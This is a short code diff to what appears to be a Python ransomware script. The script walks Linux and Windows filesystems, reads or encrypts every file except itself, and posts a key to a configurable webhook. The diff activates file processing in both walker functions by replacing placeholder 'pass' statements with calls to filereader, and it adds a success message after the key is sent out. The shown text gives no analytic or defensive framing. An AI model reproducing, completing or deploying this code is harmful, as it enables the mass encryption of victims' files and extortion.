@@ -13,6 +13,7 @@ webhook = "Your webhook API"  # change this to your webhook API
 def key_sender(data):
     try:
         post(webhook, data)
+        print("[+]successful sent the key to webhook")
     except Exception as e:
         print("[-]failed to send the key, error: ", e)
 
@@ -38,7 +39,7 @@ def linux_walker():
                 if filepath == __file__:
                     continue
                 else:
-                    pass
+                    filereader(filepath)
         except PermissionError:
             print(f"[-]permission error to read/encrypt {file}")
         except FileNotFoundError:
@@ -61,7 +62,7 @@ def windows_walker():
                     if filepath == __file__:
                         continue
                     else:
-                        pass
+                        filereader(filepath)
             except PermissionError:
                 print(f"[-]permission error to read/encrypt {file}")
             except FileNotFoundError:
